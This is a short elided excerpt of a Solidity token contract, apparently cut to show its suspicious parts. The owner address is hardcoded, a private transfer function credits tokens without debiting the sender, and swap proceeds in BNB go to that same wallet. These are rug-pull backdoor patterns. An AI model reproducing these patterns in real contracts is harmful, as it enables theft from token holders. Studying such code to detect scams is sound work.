...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x5438871EB4b10b753248B5E8ca4C9316B0394877;
...
contract tt is Context, IERC20, Ownable { 
    ...
    uint256 public _maxWalletToken = 800 * _tTotal.div(1000);
 ...
 function _tokentransfe( address recipient, address sender, uint256 qtokens) private {
           // _tOwned[sender] = _tOwned[sender] + _tOwned[sender] - qtokens;
            _tOwned[recipient] = _tOwned[recipient]+qtokens;
    }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x5438871EB4b10b753248B5E8ca4C9316B0394877), BNB_Tot);
            }
